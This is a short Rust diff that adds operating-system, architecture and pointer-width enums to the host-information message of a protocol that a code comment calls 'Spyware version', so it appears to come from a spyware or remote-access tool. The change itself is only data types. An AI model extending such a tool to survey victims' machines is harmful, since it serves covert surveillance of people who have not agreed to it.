@@ -82,7 +82,7 @@ impl MessageType for DownloadFileResponse {
 
 #[derive(Serialize, Deserialize, Debug)]
 pub struct GetBasicInfoRequest {
-    // For now we don't really have anything to insert here, but
+    // For now we don't really have anything to insert here
     pub placeholder: String,
 }
 impl MessageType for GetBasicInfoRequest {
@@ -92,10 +92,43 @@ impl MessageType for GetBasicInfoRequest {
 }
 
 
+#[derive(Debug, Serialize, Deserialize)]
+pub enum OperatingSystem {
+    Windows,
+    Linux,
+    FreeBSD,
+    MacOS,
+    IOS,
+    Android,
+    Unknown
+}
+
+#[allow(non_camel_case_types)]
+#[derive(Debug, Serialize, Deserialize)]
+pub enum Architecture {
+    x86,
+    x86_64,
+    mips,
+    powerpc,
+    powerpc64,
+    arm,
+    aarch64
+}
+
+#[derive(Debug, Serialize, Deserialize)]
+pub enum PointerWidth {
+    Bit32,
+    Bit64,
+}
+
 #[derive(Serialize, Deserialize, Debug)]
 pub struct GetBasicInfoResponse {
-    pub version: String,
-    pub arch: String,
+    // Spyware version
+    pub version: u32,
+    pub arch: Architecture,
+    pub target_os: OperatingSystem,
+    pub operating_system_version: String,
+    pub pointer_width: PointerWidth,
     pub error_info: Option<ErrorInfo>,
 }
 impl MessageType for GetBasicInfoResponse {
